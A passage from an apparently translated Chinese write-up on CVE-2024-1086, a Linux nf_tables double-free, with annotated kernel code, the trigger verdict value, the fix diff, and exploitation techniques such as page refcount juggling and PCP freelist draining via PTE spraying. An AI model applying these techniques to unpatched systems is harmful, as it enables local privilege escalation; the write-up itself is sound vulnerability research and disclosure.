<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当 skb 触发链时，遍历现有规则</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_hook_slow</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> nf_hook_state *state,</span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="keyword">struct</span> nf_hook_entries *e, <span class="type">unsigned</span> <span class="type">int</span> s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> verdict;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每个规则</span></span><br><span class="line">    <span class="keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) &#123;</span><br><span class="line">        <span class="comment">// 获取规则的判决</span></span><br><span class="line">        verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) &#123;</span><br><span class="line">        <span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 继续下一个规则</span></span><br><span class="line">        <span class="keyword">case</span> NF_DROP:</span><br><span class="line">            kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查判决是否包含 drop 错误</span></span><br><span class="line">            ret = NF_DROP_GETERR(verdict);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">                ret = -EPERM;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 立即返回（不评估其他规则）</span></span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [省略] 其他判决情况</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            WARN_ON_ONCE(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="3-2-根本原因分析"><a href="#3-2-根本原因分析" class="headerlink" title="3.2 根本原因分析"></a>3.2 根本原因分析</h2><p>该漏洞的根本原因相对简单，是一个输入验证的缺陷。其影响是产生了一个稳定的双重释放原语。</p>
<p>数据流分析的关键细节在于，当为 Netfilter 钩子创建判决对象时，内核允许了正的丢弃错误值。这意味着攻击用户可以造成如下情形：当某个钩子&#x2F;规则返回 <code>NF_DROP</code> 时，<code>nf_hook_slow()</code> 会释放 <code>skb</code> 对象，然后返回 <code>NF_ACCEPT</code>，就好像链中的每个钩子&#x2F;规则都返回了 <code>NF_ACCEPT</code> 一样。这导致 <code>nf_hook_slow()</code> 的调用者错误解释了情况，继续解析数据包并最终导致双重释放。</p>
<p>以下是代码片段的详细说明：</p>
<p>代码块 3.2.1：<code>nft_verdict_init()</code> 函数用 C 语言编写，用于构建 netfilter 判决对象。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户态 API（基于 netlink）的处理器，用于初始化判决</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_verdict_init</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx, <span class="keyword">struct</span> nft_data *data,</span></span><br><span class="line"><span class="params">			    <span class="keyword">struct</span> nft_data_desc *desc, <span class="type">const</span> <span class="keyword">struct</span> nlattr *nla)</span></span><br><span class="line">&#123;</span><br><span class="line">	u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_VERDICT_MAX</span> + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// [省略] 初始化内存</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 恶意用户：data-&gt;verdict.code = 0xffff0000</span></span><br><span class="line">	<span class="keyword">switch</span> (data-&gt;verdict.code) &#123;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="comment">// data-&gt;verdict.code &amp; NF_VERDICT_MASK == 0x0 (NF_DROP)</span></span><br><span class="line">		<span class="keyword">switch</span> (data-&gt;verdict.code &amp; NF_VERDICT_MASK) &#123;</span><br><span class="line">		<span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">		<span class="keyword">case</span> NF_DROP:</span><br><span class="line">		<span class="keyword">case</span> NF_QUEUE:</span><br><span class="line">			<span class="keyword">break</span>;  <span class="comment">// 正常流程</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">		fallthrough;</span><br><span class="line">	<span class="keyword">case</span> NFT_CONTINUE:</span><br><span class="line">	<span class="keyword">case</span> NFT_BREAK:</span><br><span class="line">	<span class="keyword">case</span> NFT_RETURN:</span><br><span class="line">		<span class="keyword">break</span>;  <span class="comment">// 正常流程</span></span><br><span class="line">	<span class="keyword">case</span> NFT_JUMP:</span><br><span class="line">	<span class="keyword">case</span> NFT_GOTO:</span><br><span class="line">		<span class="comment">// [省略] 处理这些情况</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 成功将判决值设置为 0xffff0000</span></span><br><span class="line">	desc-&gt;len = <span class="keyword">sizeof</span>(data-&gt;verdict);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>代码块 3.2.2：<code>nf_hook_slow()</code> 函数用 C 语言编写，用于遍历 nftables 规则。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当 skb 触发链时遍历现有规则</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_hook_slow</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> nf_hook_state *state,</span></span><br><span class="line"><span class="params">         <span class="type">const</span> <span class="keyword">struct</span> nf_hook_entries *e, <span class="type">unsigned</span> <span class="type">int</span> s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> verdict;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) &#123;</span><br><span class="line">        <span class="comment">// 恶意规则：verdict = 0xffff0000</span></span><br><span class="line">        verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0xffff0000 &amp; NF_VERDICT_MASK == 0x0 (NF_DROP)</span></span><br><span class="line">        <span class="keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) &#123;  </span><br><span class="line">        <span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_DROP:</span><br><span class="line">            <span class="comment">// 双重释放的第一次释放</span></span><br><span class="line">            kfree_skb_reason(skb,</span><br><span class="line">                     SKB_DROP_REASON_NETFILTER_DROP);  </span><br><span class="line">            </span><br><span class="line">            <span class="comment">// NF_DROP_GETERR(0xffff0000) == 1 (NF_ACCEPT)</span></span><br><span class="line">            ret = NF_DROP_GETERR(verdict);  </span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">                ret = -EPERM;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 返回 NF_ACCEPT（继续处理数据包）</span></span><br><span class="line">            <span class="keyword">return</span> ret;  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// [省略] 其他判决情况</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            WARN_ON_ONCE(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>代码块 3.2.3：<code>NF_HOOK()</code> 函数用 C 语言编写，当成功时调用回调函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">NF_HOOK</span><span class="params">(<span class="type">uint8_t</span> pf, <span class="type">unsigned</span> <span class="type">int</span> hook, <span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, </span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> net_device *in, <span class="keyword">struct</span> net_device *out, </span></span><br><span class="line"><span class="params">	<span class="type">int</span> (*okfn)(<span class="keyword">struct</span> net *, <span class="keyword">struct</span> sock *, <span class="keyword">struct</span> sk_buff *))</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 导致调用 nf_hook_slow()</span></span><br><span class="line">	<span class="type">int</span> ret = nf_hook(pf, hook, net, sk, skb, in, out, okfn);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果 skb 通过了规则，处理 skb，并导致双重释放</span></span><br><span class="line">	<span class="keyword">if</span> (ret == NF_ACCEPT)</span><br><span class="line">		ret = okfn(net, sk, skb);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="3-3-漏洞的影响与利用"><a href="#3-3-漏洞的影响与利用" class="headerlink" title="3.3. 漏洞的影响与利用"></a>3.3. 漏洞的影响与利用</h2><p>如前所述，这个漏洞在正确的代码路径被命中时，会给我们留下一个非常强大的双重释放原语。双重释放影响 <code>sk_buff</code> 对象（位于 <code>skbuff_head_cache</code> slab 缓存中），以及一个动态大小的 <code>sk_buff-&gt;head</code> 对象，该对象可以从 <code>kmalloc-256</code> 到从伙伴分配器直接分配的 order 4 页（65536 字节），具体取决于 IPv4 数据包（甚至可能更多，如 IPv6 jumbo 数据包）。</p>
<p><code>sk_buff-&gt;head</code> 对象通过 <code>__alloc_skb()</code> 中的类似 <code>kmalloc</code> 的接口（即 <code>kmalloc_reserve()</code>）来分配。这使得我们可以动态分配对象的大小。因此，我们可以从 slab 分配器中分配 256 字节大小的对象，甚至从伙伴分配器中分配 65536 字节的完整页面。有关这部分的功能概述，请参考背景信息部分中的页面分配小节。</p>
<p><code>sk_buff-&gt;head</code> 对象的大小直接受到网络数据包大小的影响，因为该对象包含了数据包的内容。因此，如果我们发送一个大小为 40 KiB 的数据包，内核将会直接从伙伴分配器分配一个 4 级页面。</p>
<p>在尝试重现漏洞时，即使所有缓解措施被禁用，内核也可能会崩溃。这是因为当 <code>skb</code> 被释放时，其某些字段（如指针）会被破坏。因此，我们应该尽量避免使用这些字段。幸运的是，我找到了一种方法可以绕过所有可能导致崩溃或常见错误的使用场景，并获得一个高度可靠的双重释放原语。我将在概念验证部分的相应小节中对此进行详细说明。</p>
<h2 id="3-4-漏洞修复"><a href="#3-4-漏洞修复" class="headerlink" title="3.4. 漏洞修复"></a>3.4. 漏洞修复</h2><p>当我向内核开发者报告该漏洞时，我提出了自己的修复方案，但遗憾的是该方案在 <code>netfilter</code> 栈中引入了一个特定的破坏性更改。</p>
<p>幸运的是，子系统的其中一位维护者提出了他们自己的优雅修复方案。这个修复方案是在 <code>netfilter</code> API 中对来自用户空间的输入进行清理，防止恶意的裁决（verdict）被添加。具体的修复使得内核完全不允许用户空间输入带有正数值的 <code>drop</code> 错误。维护者提到，如果未来需要这种行为，应该只允许 <code>n &lt;= 0</code> 的 <code>drop</code> 错误，以防止类似的漏洞出现。这是因为像 <code>1</code> 这样的正数 <code>drop</code> 错误会与 <code>NF_ACCEPT</code> 重叠。</p>
<p>此外，这个漏洞被分配了编号 CVE-2024-1086（在 Linux 内核成为 CNA 并破坏 CVE 含义之前）。</p>
<p>代码块 3.4.1：CVE-2024-1086 的描述。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A use-after-free vulnerability in the Linux kernel&#x27;s netfilter: nf_tables component can be exploited to achieve local privilege escalation.</span><br><span class="line"></span><br><span class="line">The nft_verdict_init() function allows positive values as drop error within the hook verdict, and hence the nf_hook_slow() function can cause a double free vulnerability when NF_DROP is issued with a drop error which resembles NF_ACCEPT.</span><br><span class="line"></span><br><span class="line">We recommend upgrading past commit f342de4e2f33e0e39165d8639387aa6c19dff660.</span><br></pre></td></tr></table></figure></div>

<p>Linux 内核的 <code>netfilter: nf_tables</code> 组件中存在一个使用后释放（use-after-free）漏洞，可以被利用来实现本地权限提升。</p>
<p><code>nft_verdict_init()</code> 函数允许在钩子裁决中使用正值作为 <code>drop</code> 错误，因此当 <code>NF_DROP</code> 被发出且具有类似于 <code>NF_ACCEPT</code> 的 <code>drop</code> 错误时，<code>nf_hook_slow()</code> 函数会导致双重释放漏洞。</p>
<p>建议升级至提交号 <code>f342de4e2f33e0e39165d8639387aa6c19dff660</code> 之后的版本。</p>
<p>代码块 3.4.2：<code>nft_verdict_init()</code> 内核函数修复漏洞的代码差异。</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/net/netfilter/nf_tables_api.c</span></span><br><span class="line"><span class="comment">+++ b/net/netfilter/nf_tables_api.c</span></span><br><span class="line"><span class="meta">@@ -10988,16 +10988,10 @@</span> static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,</span><br><span class="line"> 	data-&gt;verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));</span><br><span class="line"> </span><br><span class="line"> 	switch (data-&gt;verdict.code) &#123;</span><br><span class="line"><span class="deletion">-	default:</span></span><br><span class="line"><span class="deletion">-		switch (data-&gt;verdict.code &amp; NF_VERDICT_MASK) &#123;</span></span><br><span class="line"><span class="deletion">-		case NF_ACCEPT:</span></span><br><span class="line"><span class="deletion">-		case NF_DROP:</span></span><br><span class="line"><span class="deletion">-		case NF_QUEUE:</span></span><br><span class="line"><span class="deletion">-			break;</span></span><br><span class="line"><span class="deletion">-		default:</span></span><br><span class="line"><span class="deletion">-			return -EINVAL;</span></span><br><span class="line"><span class="deletion">-		&#125;</span></span><br><span class="line"><span class="deletion">-		fallthrough;</span></span><br><span class="line"><span class="addition">+	case NF_ACCEPT:</span></span><br><span class="line"><span class="addition">+	case NF_DROP:</span></span><br><span class="line"><span class="addition">+	case NF_QUEUE:</span></span><br><span class="line"><span class="addition">+		break;</span></span><br><span class="line"> 	case NFT_CONTINUE:</span><br><span class="line"> 	case NFT_BREAK:</span><br><span class="line"> 	case NFT_RETURN:</span><br><span class="line"><span class="meta">@@ -11032,6 +11026,8 @@</span> static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,</span><br><span class="line"> </span><br><span class="line"> 		data-&gt;verdict.chain = chain;</span><br><span class="line"> 		break;</span><br><span class="line"><span class="addition">+	default:</span></span><br><span class="line"><span class="addition">+		return -EINVAL;</span></span><br><span class="line"> 	&#125;</span><br><span class="line"> </span><br><span class="line"> 	desc-&gt;len = sizeof(data-&gt;verdict);</span><br></pre></td></tr></table></figure></div>
<p>您可以在 kernel lore 网站上了解更多关于修复的信息：<a class="link"   target="_blank" rel="noopener" href="https://lore.kernel.org/all/20240120215012.129529-1-fw@strlen.de" >[PATCH nf] netfilter: nf_tables: reject QUEUE&#x2F;DROP verdict parameters<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h1 id="4-技术"><a href="#4-技术" class="headerlink" title="4. 技术"></a>4. 技术</h1><h2 id="4-1-页面引用计数操控"><a href="#4-1-页面引用计数操控" class="headerlink" title="4.1 页面引用计数操控"></a>4.1 页面引用计数操控</h2><p>漏洞利用所需的第一项技术是操控页面引用计数。当我们尝试使用专用 API 函数在内核中对页面进行双重释放时，内核将检查该页面的引用计数：</p>
<p><strong>代码块 4.1.1</strong>：<code>__free_pages()</code> 内核函数的 C 代码，包含原始注释。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __free_pages(<span class="keyword">struct</span> page *page, <span class="type">unsigned</span> <span class="type">int</span> order)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 在释放引用前获取 PageHead */</span></span><br><span class="line">    <span class="type">int</span> head = PageHead(page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">        free_the_page(page, order);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!head)</span><br><span class="line">        <span class="keyword">while</span> (order-- &gt; <span class="number">0</span>)</span><br><span class="line">            free_the_page(page + (<span class="number">1</span> &lt;&lt; order), order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在释放页面之前，引用计数通常为 1（除非它是共享的，或者有其他情况，则引用计数会更高）。如果页面的引用计数在减一后低于 0，则它将拒绝释放该页面（<code>put_page_testzero()</code> 将返回 <code>false</code>）。这意味着我们不应该能够双重释放页面……除非？</p>
<p>敏锐的读者会注意到，在引用计数变为 0 后，多个子页面仍然会被释放，直到 <code>order-- == 0</code>。然而，在第一次释放页面后，页面的 <code>order</code> 会设置为 0。因此在第二次释放时，由于 <code>order-- == -1</code>，将不会释放任何页面。我们将在“设置页面 <code>order</code> 为 0 的技术”部分滥用这一事实，将双重释放的页面转换为 <code>order</code> 为 0。</p>
<p>在双重释放的情况下：当我们第一次释放页面时，引用计数会减少为 0，因此页面会被释放，因为上述代码允许这样做。然而，当我们尝试第二次释放该页面时，引用计数会减少为 -1，并且不会被释放，因为引用计数不等于 0，甚至可能会在启用了 <code>CONFIG_DEBUG_VM</code> 的情况下引发 <code>BUG()</code>。</p>
<p>那么，我们如何双重释放页面呢？很简单：在第二次释放之前再次分配该页面，因为这样一来，看起来就像是正常释放了一个页面，而不是双重释放。这可以是具有相同大小的任何对象，例如一个 <code>slab</code> 或页表（在这个漏洞利用中我使用了它）。</p>
<p>最简单的形式下，这项技术的实现代码如下所示：</p>
<p><strong>代码块 4.1.2</strong>：自定义内核模块的 C 代码，包含描述页面引用计数的注释。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kref_juggling</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">skb1</span>, *<span class="title">pmd</span>, *<span class="title">pud</span>;</span></span><br><span class="line"></span><br><span class="line">    skb1 = alloc_page(GFP_KERNEL);  <span class="comment">// 引用计数 0 -&gt; 1</span></span><br><span class="line">    __free_page(skb1);  <span class="comment">// 引用计数 1 -&gt; 0</span></span><br><span class="line">    pmd = alloc_page(GFP_KERNEL);  <span class="comment">// 引用计数 0 -&gt; 1</span></span><br><span class="line">    __free_page(skb1);  <span class="comment">// 引用计数 1 -&gt; 0</span></span><br><span class="line">    pud = alloc_page(GFP_KERNEL);  <span class="comment">// 引用计数 0 -&gt; 1</span></span><br><span class="line"></span><br><span class="line">    pr_err(<span class="string">&quot;[*] skb1: %px (phys: %016llx), pmd: %px (phys: %016llx), pud: %px (phys: %016llx)\n&quot;</span>, skb1, page_to_phys(skb1), pmd, page_to_phys(pmd), pud, page_to_phys(pud));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>从漏洞利用后的清理方面来看，这非常简单：只需任意释放两个对象，因为内核会因为引用计数原因而拒绝双重释放页面。:-)</p>
<h2 id="4-2-页面空闲列表条目从-order-4-到-order-0"><a href="#4-2-页面空闲列表条目从-order-4-到-order-0" class="headerlink" title="4.2 页面空闲列表条目从 order 4 到 order 0"></a>4.2 页面空闲列表条目从 <code>order 4</code> 到 <code>order 0</code></h2><p>当通过 <code>__do_kmalloc_node()</code> 分配对象时（例如 <code>skb</code>），分配对象的大小会与 <code>KMALLOC_MAX_CACHE_SIZE</code>（最大 <code>slab</code> 分配器大小）进行比较。如果对象大于此值，将使用页面分配器而不是 <code>slab</code> 分配器。这在我们希望确定性地释放像 <code>skb</code> 数据这样的页面，并使用相同的算法和空闲列表分配像 <code>PTE</code> 页面这样的页面时非常有用。然而，<code>KMALLOC_MAX_CACHE_SIZE</code> 的值相当于 <code>PAGE_SIZE * 2</code>，这意味着对于大于 <code>order 1</code>（2 页，或 8096 字节）的分配，<code>kmalloc</code> 将使用页面分配器。</p>
<p>但不幸的是，一些我们可能想要目标化的对象仅由页面分配器分配，而这些对象仍然落在 <code>slab</code> 分配器的大小范围内。例如，开发者可能会使用 <code>alloc_page()</code> 而不是 <code>kmalloc(4096)</code>，因为这样可以节省开销。一个例子是 <code>PTE</code> 页面（或任何其他页表页面），它使用 <code>order 0</code>（1 页，或 4096 字节）的页面分配。</p>
<p>如果我们双重释放一个由 <code>slab</code> 分配器处理的 4096 字节对象（即 <code>order==0</code> 页），它会进入 <code>slabcaches</code>，而不是进入 <code>pagecache</code>。因此，为了在 <code>order==0</code> 空闲列表中双重分配页面，我们需要将 <code>order 4</code>（16 页）的空闲列表条目转换为 <code>order 0</code>（1 页）的空闲列表条目。</p>
<p>幸运的是，我找到两种方法可以用 <code>order==4</code> 页的空闲列表条目分配 <code>order==0</code> 页。</p>
<h3 id="4-2-1-清空-PCP-列表"><a href="#4-2-1-清空-PCP-列表" class="headerlink" title="4.2.1 清空 PCP 列表"></a>4.2.1 清空 PCP 列表</h3><p>此方法利用了 <code>PCP</code> 分配器本质上是一个面向 <code>buddy</code> 分配器的每个 CPU 的空闲列表的事实。当其中一个 <code>PCP</code> 空闲列表为空时，它会从 <code>buddy</code> 分配器中重新填充页面。</p>
<blockquote>
<p>有关页面分配过程的功能概述（包括 <code>if</code> 语句、<code>slab</code> 分配器和 <code>buddy</code> 分配器），请查看背景部分中的页面分配子部分。</p>
</blockquote>
<p><strong>插图 4.2.1.1</strong>：将页面 <code>order</code> 设置为 0 的内存操作时间线。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/pcp_refill-3.svg"
                     
                >重新填充时，会以 <code>count = N/order</code> 页对象的形式进行批量操作。因此，<code>rmqueue_bulk()</code> 函数（用于重新填充）从 <code>buddy</code> 分配器中分配了 <code>count</code> 页，<code>order</code> 为 <code>order</code>。当从 <code>buddy</code> 分配器中分配页面时，它会遍历 <code>buddy</code> 页空闲列表，如果 <code>buddy</code> 空闲列表条目的 <code>order &gt;= order</code>，那么它会返回此页面进行重新填充。如果 <code>buddy</code> 空闲列表条目的 <code>order &gt; order</code>，则 <code>buddy</code> 分配器将在内部将页面拆分。</p>
<p>请注意，我们的漏洞利用双重释放的页面 <code>order == 4</code>，并且需要用 <code>order == 0</code> 的 <code>PCP</code> 页填充这些页面。当我们释放它时，<code>order == 4</code> 的页面将被添加到 <code>buddy</code> 空闲列表中。对于我们的漏洞利用，我们希望将一个 <code>order == 0</code> 页放置在这 16 个页面中，因为 <code>order == 4</code> 的页面将被双重释放。<code>order == 0</code> 页面的分配是通过具有每个 <code>order</code> 空闲列表的 <code>PCP</code> 分配器进行的。然而，<code>PCP</code> 重新填充机制会使用任何合适的 <code>buddy</code> 页面。因此，我们可以将 16 个 <code>PTE</code> 页分配到双重释放的 <code>order == 4</code> 页中。</p>
<p>如前所述，要触发此机制，我们必须首先通过喷射页面分配来排空目标 CPU 的 <code>PCP</code> 空闲列表。在我的漏洞利用中，我通过喷射 <code>PTE</code> 页面来实现这一点，这直接与 <code>Dirty Pagedirectory</code> 技术相关。由于我们无法确定 <code>PCP</code> 空闲列表是否已排空，我们需要假设喷射的对象之一已分配到双重释放的对象中。因此，我喷射 <code>PTE</code> 对象，以便 <code>PTE</code> 对象占据双重释放的 <code>buddy</code> 页中的一个位置。如果我想分配一个 <code>PMD</code> 对象，我会喷射 <code>PMD</code> 对象，以此类推。</p>
<p>空闲列表中的对象数量因系统和资源使用情况而异。对于这个漏洞利用，我使用了 16000 个 <code>PTE</code> 对象，这在我遇到的所有情况下都足以排空空闲列表。</p>
<p><strong>代码块 4.2.1.2</strong>：<code>rmqueue_bulk()</code> 内核函数的 C 代码，用于重新填充 <code>PCP</code> 空闲列表。</p>
